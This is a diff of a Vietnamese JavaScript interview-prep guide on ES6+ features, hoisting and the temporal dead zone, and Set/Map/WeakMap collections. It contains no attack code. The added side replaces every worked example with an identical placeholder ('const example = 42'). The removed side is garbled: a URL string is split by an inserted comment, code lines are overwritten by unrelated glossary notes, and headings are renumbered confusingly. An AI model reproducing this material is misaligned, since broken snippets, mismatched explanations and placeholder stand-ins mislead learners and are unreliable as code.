-const spreadObj2 = { c: 3, d: 4 };
-const spreadObjCombined = { ...spreadObj1, ...spreadObj2 }; // Chú giải: {a:1, b:2, c:3, d:4}
-
- // Chú giải: Override properties
-const overridden = { ...spreadObj1, b: 99 }; // {a:1, b:99} - b bị ghi đè
-
- // Chú giải: Spread trong function calls
-const maxNum = Math.max(...spreadArr1); // Chú giải: Math.max(1, 2, 3) = 3
-
-// Rest parameters (thu thập remaining arguments vào array)
-function modernSum(...numbers: number[]) {
-  // numbers là array [1,2,3,...]
-  return numbers.reduce((total, num) => total + num, 0);
-}
-
-modernSum(1, 2, 3, 4, 5); // Chú giải: 15
-
- // Chú giải: Rest in destructuring
-const [head, ...tail] = [1, 2, 3, 4]; // Chú giải: head=1, tail=[2,3,4]
-const { x, ...others } = { x: 1, y: 2, z: 3 }; // Chú giải: x=1, others={y:2, z:3}
-
- // Chú giải: ============================================
- // Chú giải: 7. DEFAULT PARAMETERS
- // Chú giải: ============================================
-
- // Chú giải: 🔴 ES5 - Manual Default Values
-function greetES5(name, greeting) {
-  // Check và assign default
-  name = name || 'Guest'; // ⚠️ Falsy values (0, '', false) cũng bị replace
-  greeting = typeof greeting !== 'undefined' ? greeting : 'Hello';
-
-  return greeting + ' ' + name;
-}
-
- // Chú giải: 🟢 ES6+ - Native Default Parameters
-// Cách hoạt động: Default chỉ apply khi argument là undefined
-function greetES6(name = 'Guest', greeting = 'Hello') {
-  return `${greeting} ${name}`;
-}
-
-greetES6(); // Chú giải: "Hello Guest"
-greetES6('John'); // Chú giải: "Hello John"
-greetES6('John', 'Hi'); // Chú giải: "Hi John"
-greetES6(undefined, 'Hey'); // "Hey Guest" - name dùng default
-
- // Chú giải: Default với expressions
-function createUser(name = 'User', id = generateId()) {
- // Chú giải: generateId() chỉ chạy khi id undefined
-  return { name, id };
-}
-
- // Chú giải: Default destructured parameters
-function configAPI({
-  url = 'https: // Chú giải: api.example.com',
-  timeout = 5000,
-  retries = 3,
-} = {}) {
-  // = {} để tránh error khi không truyền argument
-  console.log({ url, timeout, retries });
-}
-
- // Chú giải: ============================================
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
- // Chú giải: ============================================
-
- // Chú giải: 🔴 ES5 - Callback Hell (pyramid of doom)
-function fetchUserES5(userId, callback) {
-  setTimeout(function () {
- // Chú giải: Simulate API call
-    var user = { id: userId, name: 'John' };
-
- // Chú giải: Nested callbacks
-    fetchPostsES5(userId, function (posts) {
-      fetchCommentsES5(posts[0].id, function (comments) {
-        fetchLikesES5(comments[0].id, function (likes) {
- // Chú giải: 😱 Callback hell - hard to read, maintain, error handle
-          callback({ user, posts, comments, likes });
-        });
-      });
-    });
-  }, 100);
-}
-
- // Chú giải: Error handling với callbacks (phức tạp)
-function fetchDataES5(callback) {
-  setTimeout(function () {
-    var error = Math.random() > 0.5 ? new Error('Failed') : null;
-    var data = error ? null : { value: 42 };
-    callback(error, data); // Chú giải: Node.js style: error-first callback
-  }, 100);
-}
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-// Cách hoạt động: Promise là object đại diện cho eventual completion/failure
-function fetchUserES6(userId: string): Promise<any> {
-  return new Promise((resolve, reject) => {
- // Chú giải: executor function chạy immediately
-    setTimeout(() => {
-      const user = { id: userId, name: 'John' };
-      resolve(user); // Chú giải: Success
- // Chú giải: reject(new Error('Failed')); // Failure
-    }, 100);
-  });
-}
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-fetchUserES6('123')
-  .then((user) => {
-    console.log('User:', user);
-    return fetchPosts(user.id); // Return promise → chain tiếp
-  })
-  .then((posts) => {
-    console.log('Posts:', posts);
-    return fetchComments(posts[0].id);
-  })
-  .then((comments) => {
-    console.log('Comments:', comments);
-    return fetchLikes(comments[0].id);
-  })
-  .then((likes) => {
-    console.log('Likes:', likes);
-  })
-  .catch((error) => {
- // Chú giải: Single catch cho tất cả errors
-    console.error('Error:', error);
-  })
-  .finally(() => {
-    // Chạy dù thành công hay fail
-    console.log('Cleanup');
-  });
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-const promise1 = fetchUserES6('1');
-const promise2 = fetchUserES6('2');
-const promise3 = fetchUserES6('3');
-
-// Promise.all - chờ tất cả resolve (hoặc 1 reject)
-Promise.all([promise1, promise2, promise3]).then((results) => {
-  console.log('All users:', results); // Chú giải: [user1, user2, user3]
-});
-
-// Promise.race - lấy kết quả của promise nhanh nhất
-Promise.race([promise1, promise2, promise3]).then((result) => {
-  console.log('First user:', result); // user nào resolve trước
-});
-
-// Promise.allSettled - chờ tất cả settle (resolve hoặc reject)
-Promise.allSettled([promise1, promise2, promise3]).then((results) => {
-  results.forEach((result) => {
-    if (result.status === 'fulfilled') {
-      console.log('Success:', result.value);
-    } else {
-      console.log('Failed:', result.reason);
-    }
-  });
-});
-
-// Promise.any - lấy promise fulfilled đầu tiên
-Promise.any([promise1, promise2, promise3]).then((result) => {
-  console.log('First successful:', result);
-});
-
- // Chú giải: ============================================
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
- // Chú giải: ============================================
-
- // Chú giải: 🟢 ES2017 - Async/Await (looks synchronous, actually async)
-// Cách hoạt động: async function tự động return Promise, await pause execution
-async function fetchAllData() {
-  try {
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-    const user = await fetchUserES6('123'); // Chú giải: Looks synchronous!
-    console.log('User:', user);
-
-    const posts = await fetchPosts(user.id); // Chú giải: Wait for user first
-    console.log('Posts:', posts);
-
-    const comments = await fetchComments(posts[0].id);
-    console.log('Comments:', comments);
-
-    const likes = await fetchLikes(comments[0].id);
-    console.log('Likes:', likes);
-
-    return { user, posts, comments, likes };
-  } catch (error) {
- // Chú giải: Try-catch cho error handling (như synchronous code)
-    console.error('Error:', error);
-    throw error; // Re-throw nếu cần
-  } finally {
-    console.log('Cleanup');
-  }
-}
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-async function fetchMultipleUsers() {
-  // ❌ Sequential (slow) - mỗi request đợi previous
-  const user1 = await fetchUserES6('1'); // Chú giải: Wait 100ms
-  const user2 = await fetchUserES6('2'); // Wait thêm 100ms
-  const user3 = await fetchUserES6('3'); // Wait thêm 100ms
- // Chú giải: Total: 300ms
-
-  // ✅ Parallel (fast) - tất cả requests cùng lúc
-  const [user1, user2, user3] = await Promise.all([
-    fetchUserES6('1'),
-    fetchUserES6('2'),
-    fetchUserES6('3'),
-  ]);
- // Chú giải: Total: 100ms (chỉ chờ slowest request)
-}
-
-// Top-level await (ES2022) - await ngoài async function
- // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
- // Chú giải: console.log(config); // ✅ OK trong module scope
-
- // Chú giải: ============================================
- // Chú giải: 10. MODULES - Import/Export
- // Chú giải: ============================================
-
- // Chú giải: 🔴 ES5 - No Native Modules
-// Phải dùng patterns như IIFE, CommonJS (Node.js), AMD (RequireJS)
-
- // Chú giải: IIFE Pattern (Immediately Invoked Function Expression)
-var MyModule = (function () {
-  var privateVar = 'secret';
-
-  function privateMethod() {
-    console.log(privateVar);
-  }
-
-  return {
-    publicMethod: function () {
-      privateMethod();
-    },
-  };
-})();
-
- // Chú giải: CommonJS (Node.js)
- // Chú giải: module.exports = { name: 'John', greet: function() {} };
- // Chú giải: const user = require('./user');
-
- // Chú giải: 🟢 ES6+ - Native Modules (static analysis, tree-shaking)
-// Cách hoạt động: Import/export statements, module scope riêng biệt
-
-// Named exports (có thể nhiều per file)
-export const PI = 3.14159;
-export function calculateArea(radius: number) {
-  return PI * radius * radius;
-}
-export class Circle {
-  constructor(public radius: number) {}
-}
-
- // Chú giải: Default export (chỉ 1 per file)
-export default class User {
-  constructor(public name: string) {}
-}
-
- // Chú giải: Import named exports
-import { PI, calculateArea, Circle } from './math';
-
- // Chú giải: Import default export
-import User from './user';
-
- // Chú giải: Import both
-import User, { PI, calculateArea } from './combined';
-
- // Chú giải: Rename imports
-import { PI as PIValue } from './math';
-
- // Chú giải: Import all
-import * as MathUtils from './math';
-MathUtils.PI; // Chú giải: 3.14159
-MathUtils.calculateArea(5);
-
- // Chú giải: Re-export (module aggregation)
-export { PI, calculateArea } from './math';
-export { default as User } from './user';
-
- // Chú giải: Dynamic imports (code splitting)
-const module = await import('./heavy-module'); // Chú giải: Lazy load
-module.doSomething();
-
- // Chú giải: Conditional imports
-if (condition) {
-  const { feature } = await import('./feature');
-  feature();
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Best Practices (Thực Hành Tốt):**
@@ -1012,106 +296,16 @@ if (condition) {
 
 **❌ Common Mistakes (Lỗi Thường Gặp):**
 
-```typescript
-// ❌ LỖI 1: Dùng var trong modern code
-var name = 'John'; // ❌ Function scoped, có thể gây bugs
-
-// ✅ ĐÚNG: Dùng const/let
-const name = 'John'; // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến. Bất biến: giá trị không thay đổi sau khi tạo; thường dùng để tránh side-effect và dễ reasoning.
-let age = 25; // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến.
-
-// ❌ LỖI 2: Arrow function làm method (lose this binding)
-const obj = {
-  value: 42,
-  getValue: () => this.value, // ❌ this = window, không phải obj
-};
-
-// ✅ ĐÚNG: Regular function cho methods
-const obj = {
-  value: 42,
-  getValue() {
-    return this.value; // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  },
-};
-
-// ❌ LỖI 3: Quên await trong async function
-async function fetchData() {
-  const data = fetchUserES6('123'); // ❌ data là Promise, không phải value
-  console.log(data.name); // Chú giải: undefined
-}
-
-// ✅ ĐÚNG: Await promise
-async function fetchData() {
-  const data = await fetchUserES6('123'); // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-  console.log(data.name); // Chú giải: "John"
-}
-
-// ❌ LỖI 4: Sequential await khi có thể parallel
-async function slow() {
-  const user1 = await fetchUser('1'); // Chú giải: 100ms
-  const user2 = await fetchUser('2'); // Chú giải: 100ms
-  const user3 = await fetchUser('3'); // Chú giải: 100ms
- // Chú giải: Total: 300ms
-}
-
-// ✅ ĐÚNG: Parallel với Promise.all
-async function fast() {
-  const [user1, user2, user3] = await Promise.all([
-    fetchUser('1'),
-    fetchUser('2'),
-    fetchUser('3'),
-  ]);
- // Chú giải: Total: 100ms
-}
-
- // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
-const original = { a: 1, nested: { b: 2 } };
-const copied = { ...original };
-copied.nested.b = 99; // ❌ original.nested.b cũng = 99!
-
-// ✅ ĐÚNG: Deep copy cho nested structures
-const copied = JSON.parse(JSON.stringify(original)); // Chú giải: Simple way
-// Hoặc dùng lodash cloneDeep, structuredClone
-
- // Chú giải: ❌ LỖI 6: Destructuring với missing properties (no default)
-const { email } = user; // ❌ email = undefined nếu không tồn tại
-
-// ✅ ĐÚNG: Provide default values
-const { email = 'no-email@example.com' } = user; // Chú giải: ✅
-
- // Chú giải: ❌ LỖI 7: Confuse default export vs named export
-import User from './user'; // ❌ Nếu file export named, không phải default
-
-// ✅ ĐÚNG: Match export type
-import { User } from './user'; // Chú giải: ✅ Named export
-import User from './user'; // Chú giải: ✅ Default export
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **📊 Performance Comparison:**
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│              ES5 vs ES6+ PERFORMANCE IMPACT                  │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  Feature                    ES5 Speed    ES6+ Speed  Winner │
-│  ────────────────────────── ──────────── ────────── ────── │
-│  Variable access (var)      ⚡⚡⚡⚡⚡      -          ES5   │
-│  Variable access (let)      -            ⚡⚡⚡⚡      ES6   │
-│  Function call (regular)    ⚡⚡⚡⚡⚡      -          ES5   │
-│  Function call (arrow)      -            ⚡⚡⚡⚡⚡     ES6   │
-│  String concat (+)          ⚡⚡⚡⚡       -          ES5   │
-│  Template literals (``)     -            ⚡⚡⚡⚡⚡     ES6   │
-│  Object creation            ⚡⚡⚡⚡       -          ES5   │
-│  Class instantiation        -            ⚡⚡⚡⚡      ES6   │
-│  Array iteration (.map)     ⚡⚡⚡⚡       -          ES5   │
-│  For-of loop                -            ⚡⚡⚡⚡⚡     ES6   │
-│  Promise                    N/A          ⚡⚡⚡        ES6   │
-│  Async/Await                N/A          ⚡⚡⚡        ES6   │
-│                                                              │
-│  💡 Note: Performance khác biệt minimal trong most cases    │
-│     Code readability & maintainability quan trọng hơn!      │
-└─────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Khi Nào Dùng ES5 vs ES6+:**
@@ -1128,13 +322,14 @@ import User from './user'; // Chú giải: ✅ Default export
 - Using build tools (Webpack, Vite, Babel)
 - TypeScript project
 ---
-## 04. ⎫ Q04: Hoisting & Temporal Dead Zone  
 
-**P1: Tên câu hỏi:** ⎫ Q04: Hoisting & Temporal Dead Zone  
+## 07. Q7: ⎫ Q04: Hoisting & Temporal Dead Zone
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ⎫ Q04: Hoisting & Temporal Dead Zone
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 08. Q8: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (1-2 phút):**
 
@@ -1178,59 +373,58 @@ import User from './user'; // Chú giải: ✅ Default export
 **📊 Detailed Explanation:**
 
 1. **`var` Hoisting**:
-   - Hoisted + initialized với `undefined`.
-   - Access trước khai báo → `undefined` (không error).
-   ```js
-   console.log(x); // Chú giải: undefined
-   var x = 5;
- // Chú giải: Engine sees: var x = undefined; console.log(x); x = 5;
-   ```
+- Hoisted + initialized với `undefined`.
+- Access trước khai báo → `undefined` (không error).
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 2. **`let/const` Hoisting + TDZ**:
-   - Hoisted nhưng NOT initialized → Temporal Dead Zone.
-   - Access trong TDZ → `ReferenceError`.
-   - TDZ = từ đầu block scope đến dòng khai báo.
-   ```js
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm.
-   console.log(y); // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-   let y = 10; // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm.
-   ```
+- Hoisted nhưng NOT initialized → Temporal Dead Zone.
+- Access trong TDZ → `ReferenceError`.
+- TDZ = từ đầu block scope đến dòng khai báo.
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 3. **Function Declaration Hoisting**:
-   - Entire function hoisted → gọi trước khai báo OK.
-   ```js
-   hello(); // Chú giải: "Hello!" ✅
-   function hello() { console.log("Hello!"); }
-   ```
+- Entire function hoisted → gọi trước khai báo OK.
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 4. **Function Expression**:
-   - Variable hoisted nhưng function không.
-   ```js
-   hello(); // Chú giải: TypeError: hello is not a function
-   var hello = function() { console.log("Hello!"); };
-   ```
+- Variable hoisted nhưng function không.
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **⚠️ Common Pitfalls:**
 - **`typeof` trong TDZ**: `typeof x` với `let x` → ReferenceError (không safe như `var`).
 - **Loop variables**: `var` trong loop → function scope, `let` → block scope per iteration.
-  ```js
-  for (var i = 0; i < 3; i++) {
-    setTimeout(() => console.log(i)); // Chú giải: 3, 3, 3 (same i)
-  }
-  for (let i = 0; i < 3; i++) {
-    setTimeout(() => console.log(i)); // Chú giải: 0, 1, 2 (different i per iteration)
-  }
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **💡 Senior Insights:**
 - **Why TDZ exists**: Force developers khai báo trước khi dùng → catch bugs sớm.
 - **Hoisting mechanism**: JavaScript engine scans code 2 passes:
   1. **Creation phase**: Allocate memory cho declarations.
   2. **Execution phase**: Execute code line-by-line.
-- **Best Practice**: 
-  - Dùng `const` by default, `let` nếu cần reassign, avoid `var`.
-  - Khai báo biến ở top của scope → explicit, tránh confusion.
-  - Dùng ESLint rule `no-use-before-define`.
+- **Best Practice**:
+- Dùng `const` by default, `let` nếu cần reassign, avoid `var`.
+- Khai báo biến ở top của scope → explicit, tránh confusion.
+- Dùng ESLint rule `no-use-before-define`.
 
 ---
 
@@ -1243,7 +437,6 @@ import User from './user'; // Chú giải: ✅ Default export
 - 🎯 **function declaration**: Hoisted toàn bộ → gọi trước khai báo OK
 - ⏰ **TDZ**: Vùng từ đầu scope đến dòng khai báo - biến tồn tại nhưng không access được
 
-
 **Trả lời:**
 
 - **Hoisting**: Cơ chế đưa declarations lên đầu scope trước khi code execute
@@ -1253,130 +446,23 @@ import User from './user'; // Chú giải: ✅ Default export
 
 **Code Example:**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ).
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-// ✅ Function Declaration - hoisted hoàn toàn
-console.log(sayHello('World')); // Chú giải: "Hello World" ✅
-function sayHello(name: string): string {
-  return `Hello ${name}`;
-}
-
-// ❌ Function Expression - không hoisted
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-const sayGoodbye = (name: string) => `Goodbye ${name}`;
-
- // Chú giải: ═══════════════════════════════════════════════════════════
-// 2. VAR HOISTING (không có TDZ)
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-console.log(x); // undefined ✅ (không lỗi)
-var x = 5;
-console.log(x); // Chú giải: 5
-
-// JavaScript "nhìn" code như:
- // Chú giải: var x = undefined;
- // Chú giải: console.log(x);
- // Chú giải: x = 5;
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm.
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-{
-  // ← TDZ BẮT ĐẦU cho biến y
-  
-  // console.log(y); // ❌ ReferenceError - đang trong TDZ!
-  // console.log(typeof y); // ❌ ReferenceError - typeof cũng không safe!
-  
-  let y = 10; // ← TDZ KẾT THÚC
-  console.log(y); // Chú giải: ✅ 10
-}
-
-// So sánh var vs let
-function compare() {
-  console.log(a); // undefined ✅ - var không có TDZ
-  var a = 1;
-  
-  // console.log(b); // ❌ ReferenceError - let có TDZ
-  let b = 2;
-}
-
- // Chú giải: ═══════════════════════════════════════════════════════════
-// 4. TDZ PITFALLS - Những cái bẫy
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm.
-{
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-  let x = 1;
-}
-
- // Chú giải: Pitfall 2: Nested scopes
-let outer = 'outer';
-{
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-  // Inner scope đã "claim" biến outer → TDZ
-  let outer = 'inner';
-}
-
- // Chú giải: Pitfall 3: Default parameters
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm. Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-function fn(a = 1, b = a) {} // ✅ OK - a đã initialize
-
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ).
-// const p = new Person(); // ❌ ReferenceError - class có TDZ
-class Person {}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Best Practices:**
 
-```typescript
-// ✅ Khai báo variables ở đầu scope
-function good() {
-  const a = 1;
-  let b = 2;
- // Chú giải: ... logic
-}
-
-// ✅ Dùng const/let, tránh var
-const API_URL = 'https://api.com'; // const cho values không đổi
-let count = 0; // Chú giải: let khi cần re-assign
-
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ).
-helper(); // Chú giải: ✅ OK
-function helper() {}
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-const process = (data) => data.map(x => x * 2);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Common Mistakes:**
 
-```typescript
- // Chú giải: ❌ Mistake 1: var trong loops
-for (var i = 0; i < 3; i++) {
-  setTimeout(() => console.log(i), 100); // Chú giải: 3, 3, 3 ❌
-}
-
- // Chú giải: ✅ Fix: let trong loops
-for (let i = 0; i < 3; i++) {
-  setTimeout(() => console.log(i), 100); // Chú giải: 0, 1, 2 ✅
-}
-
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm.
-{
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-  let value = 10;
-}
-
-// ✅ Fix: Khai báo trước khi dùng
-{
-  let value = 10;
-  console.log(value); // Chú giải: ✅ 10
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **So Sánh:**
@@ -1398,13 +484,14 @@ for (let i = 0; i < 3; i++) {
 - **typeof không safe** trong TDZ!
 - **Luôn dùng const/let**, tránh var
 ---
-## 05. 🗂️ Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References  
 
-**P1: Tên câu hỏi:** 🗂️ Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References  
+## 09. Q9: 🗂️ Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🗂️ Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 10. Q10: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -1443,9 +530,6 @@ for (let i = 0; i < 3; i++) {
 - WeakMap **không có memory leak** khi attach metadata vào DOM nodes (auto cleanup khi node removed)
 - FinalizationRegistry chỉ dùng cho **cleanup non-JS resources** (file handles, WASM memory), không dùng cho app logic
 
-
-
-
 **⚡ Quick Summary:**
 > **Set** = unique values, **Map** = key-value (any type). **Weak** = không prevent GC, keys phải là objects
 
@@ -1480,402 +564,9 @@ for (let i = 0; i < 3; i++) {
 
 **Code Example:**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: 1. SET - Collection Unique Values
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Set lưu trữ unique values (không duplicate)
- * - Có thể iterate qua các values
- * - Performance O(1) cho add, delete, has operations
- */
-let numberSet: Set<number> = new Set([1, 2, 3, 3, 4]);
-console.log(numberSet); // Chú giải: Set(4) {1, 2, 3, 4} - duplicate removed
-
-numberSet.add(5);
-numberSet.delete(1);
-console.log(numberSet.has(2)); // Chú giải: true
-console.log(numberSet.size); // Chú giải: 4
-
- // Chú giải: Iterate Set
-for (let value of numberSet) {
-  console.log(value); // Chú giải: 2, 3, 4, 5
-}
-
- // Chú giải: Use cases cho Set
- // Chú giải: 1. Remove duplicates từ array
-const numbers = [1, 2, 2, 3, 3, 4, 5, 5];
-const uniqueNumbers = [...new Set(numbers)]; // Chú giải: [1, 2, 3, 4, 5]
-
- // Chú giải: 2. Check membership (nhanh hơn array.includes)
-const validIds = new Set([1, 5, 10, 15]);
-console.log(validIds.has(5)); // Chú giải: true - O(1) time
-
- // Chú giải: 3. Set operations
-const setA = new Set([1, 2, 3, 4]);
-const setB = new Set([3, 4, 5, 6]);
-
- // Chú giải: Union (hợp)
-const union = new Set([...setA, ...setB]); // Chú giải: {1, 2, 3, 4, 5, 6}
-
- // Chú giải: Intersection (giao)
-const intersection = new Set([...setA].filter((x) => setB.has(x))); // Chú giải: {3, 4}
-
-// Difference (hiệu)
-const difference = new Set([...setA].filter((x) => !setB.has(x))); // Chú giải: {1, 2}
-
- // Chú giải: ============================================
- // Chú giải: 2. MAP - Key-Value Pairs với Any Type Keys
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Map cho phép keys là BẤT KỲ TYPE NÀO (objects, functions, primitives)
- * - Object chỉ cho phép string/symbol keys
- * - Map giữ insertion order
- * - Performance tốt hơn Object cho frequent additions/deletions
- */
-let userMap: Map<string, { name: string; age: number }> = new Map();
-userMap.set('user1', { name: 'John', age: 25 });
-userMap.set('user2', { name: 'Jane', age: 30 });
-
-console.log(userMap.get('user1')); // Chú giải: {name: "John", age: 25}
-console.log(userMap.has('user1')); // Chú giải: true
-console.log(userMap.size); // Chú giải: 2
-
- // Chú giải: Iterate Map
-for (let [key, value] of userMap) {
-  console.log(`${key}: ${value.name}`);
-}
-
- // Chú giải: Map vs Object - Key Types
-let obj: { [key: string]: any } = {};
-obj[1] = 'one'; // Chú giải: key becomes STRING "1"
-obj[true] = 'true'; // Chú giải: key becomes STRING "true"
-console.log(Object.keys(obj)); // Chú giải: ["1", "true"]
-
-let map = new Map();
-map.set(1, 'one'); // Chú giải: key is NUMBER 1
-map.set(true, 'true'); // Chú giải: key is BOOLEAN true
-map.set({ id: 1 }, 'object key'); // Chú giải: key is OBJECT
-
-console.log(map.get(1)); // Chú giải: "one"
-console.log(map.get(true)); // Chú giải: "true"
-
- // Chú giải: Use cases cho Map
- // Chú giải: 1. Metadata storage với object keys
-const metadataMap = new Map<object, { createdAt: Date; author: string }>();
-const element = document.querySelector('.btn');
-metadataMap.set(element, {
-  createdAt: new Date(),
-  author: 'John',
-});
-
- // Chú giải: 2. Cache với function keys
-const memoCache = new Map<Function, any>();
-function expensiveOperation(fn: Function) {
-  if (memoCache.has(fn)) {
-    return memoCache.get(fn);
-  }
-  const result = fn();
-  memoCache.set(fn, result);
-  return result;
-}
-
- // Chú giải: 3. Counting occurrences
-const wordCount = new Map<string, number>();
-const words = ['apple', 'banana', 'apple', 'cherry', 'banana', 'apple'];
-words.forEach((word) => {
-  wordCount.set(word, (wordCount.get(word) || 0) + 1);
-});
-console.log(wordCount); // Chú giải: Map { "apple" => 3, "banana" => 2, "cherry" => 1 }
-
- // Chú giải: ============================================
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object. `WeakMap`/`WeakSet` giữ tham chiếu yếu: không ngăn đối tượng bị thu gom rác khi không còn tham chiếu mạnh, hữu ích cho cache không cố định.
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - WeakSet chỉ chứa objects (không chứa primitives)
- * - Weak reference: không prevent garbage collection
- * - Không iterable, không có size, không có clear()
- * - Use case: Track objects mà không prevent chúng bị GC
- */
-let weakSet: WeakSet<object> = new WeakSet();
-let obj1: any = { name: 'A' };
-let obj2: any = { name: 'B' };
-
-weakSet.add(obj1);
-weakSet.add(obj2);
-console.log(weakSet.has(obj1)); // Chú giải: true
-
-obj1 = null; // obj1 có thể bị garbage collected ngay
-// weakSet KHÔNG prevent obj1 khỏi bị GC
-
-// Use case: Track DOM elements mà không prevent cleanup
-class DOMElementTracker {
-  private processedElements = new WeakSet<HTMLElement>();
-
-  markAsProcessed(element: HTMLElement): void {
-    this.processedElements.add(element);
-  }
-
-  isProcessed(element: HTMLElement): boolean {
-    return this.processedElements.has(element);
-  }
-
-  // Khi element removed khỏi DOM và không còn references,
-  // nó sẽ tự động removed khỏi WeakSet qua GC
-}
-
- // Chú giải: ============================================
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object. `WeakMap`/`WeakSet` giữ tham chiếu yếu: không ngăn đối tượng bị thu gom rác khi không còn tham chiếu mạnh, hữu ích cho cache không cố định.
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - WeakMap keys PHẢI là objects (không phải primitives)
- * - Keys là weak references - không prevent GC
- * - Không iterable, không có size
- * - Use case: Private data, metadata cho objects
- */
-let weakMap: WeakMap<object, string> = new WeakMap();
-let keyObj: any = { id: 1 };
-weakMap.set(keyObj, 'value');
-console.log(weakMap.get(keyObj)); // Chú giải: "value"
-
-keyObj = null; // keyObj có thể bị GC, entry tự động removed
-
